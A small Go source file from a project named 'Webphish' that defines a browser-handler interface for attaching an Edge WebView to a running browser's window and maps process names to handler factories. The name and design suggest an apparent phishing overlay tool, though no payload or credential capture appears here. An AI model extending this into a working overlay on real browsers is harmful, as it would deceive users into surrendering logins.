package handler

import (
	"Webphish/internal/edge"
	"Webphish/internal/resource"
	"Webphish/internal/writer"
	"golang.org/x/sys/windows"
)

type BrowserHandler interface {
	Handle(title string, hwnd windows.HWND) (parent windows.HWND, created edge.WebView)
	SetOutputWriter(writer writer.ApplicationOutputWriter)
	OutputWriter() writer.ApplicationOutputWriter
	ResourceLoader() resource.Loader
	SetResourceLoader(loader resource.Loader)
}

type BrowserHandlerFactory interface {
	New() BrowserHandler
}

var BrowserTypes = map[string]BrowserHandlerFactory{
	"chrome.exe":      &ChromeHandlerFactory{},
	"firefox.exe":     nil,
	"edge.exe":        nil,
	"___Run_EXE.exe":  &ChromeHandlerFactory{},
	"___1Run_EXE.exe": &ChromeHandlerFactory{},
	"webphish.exe":    &ChromeHandlerFactory{},
}

func GetBrowser(name string) (handler BrowserHandler, success bool) {
	for browserType, browserHandler := range BrowserTypes {
		if name == browserType {
			handler = browserHandler.New()
			return handler, true
		}
	}
	return nil, false
}
